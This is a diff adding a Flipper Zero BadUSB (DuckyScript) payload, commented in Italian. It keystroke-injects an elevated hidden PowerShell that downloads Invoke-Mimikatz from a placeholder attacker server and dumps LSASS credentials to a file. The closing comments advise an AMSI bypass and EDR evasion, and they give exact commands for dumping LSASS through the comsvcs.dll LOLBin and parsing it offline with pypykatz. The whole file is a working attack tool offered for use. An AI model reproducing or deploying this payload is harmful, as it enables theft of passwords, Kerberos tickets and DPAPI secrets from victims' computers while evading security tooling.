@@ -1,0 +1,43 @@
+REM ============================================================
+REM Title:    Mimikatz In-Memory Loader
+REM Target:   Windows 10/11
+REM Author:   FlipperZero-guide
+REM Category: Credential Harvest
+REM Privs:    Admin REQUIRED
+REM Layout:   IT
+REM Time:     ~8 secondi
+REM Detect:   Critico - mimikatz è la firma più cercata dagli EDR
+REM Desc:     Scarica ed esegue Invoke-Mimikatz in memoria
+REM           (fileless). Richiede AMSI bypass preventivo.
+REM           Dumpa credenziali LSASS, ticket Kerberos, DPAPI.
+REM CHANGE:   ATTACKER_IP con il tuo server che serve lo script
+REM SETUP:    Scarica Invoke-Mimikatz.ps1 e servilo:
+REM           python3 -m http.server 8080
+REM ============================================================
+
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell Start-Process powershell -Verb runAs -ArgumentList '-w hidden -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString(''http://ATTACKER_IP:8080/Invoke-Mimikatz.ps1'');Invoke-Mimikatz -Command ''sekurlsa::logonpasswords'' | Out-File $env:TEMP\mimi_output.txt"'
+ENTER
+DELAY 2000
+ALT y
+
+REM ============================================================
+REM NOTA: Questo payload VERRà BLOCCATO dalla maggior parte
+REM degli EDR moderni. Per un engagement reale:
+REM
+REM 1. Usa il payload AMSI bypass PRIMA di questo
+REM 2. Considera alternative a mimikatz:
+REM    - pypykatz (Python, no signature)
+REM    - nanodump (dump LSASS diretto)
+REM    - HandleKatz (handle duplication)
+REM    - MiniDumpWriteDump via comsvcs.dll (LOLBin):
+REM      rundll32 comsvcs.dll,MiniDump [LSASS_PID] dump.bin full
+REM
+REM 3. Alternativa LOLBin per dump LSASS senza mimikatz:
+REM    tasklist /fi "imagename eq lsass.exe"
+REM    rundll32 comsvcs.dll,MiniDump <PID> %TEMP%\lsass.dmp full
+REM    Poi analizza offline con pypykatz:
+REM    pypykatz lsa minidump lsass.dmp
+REM ============================================================
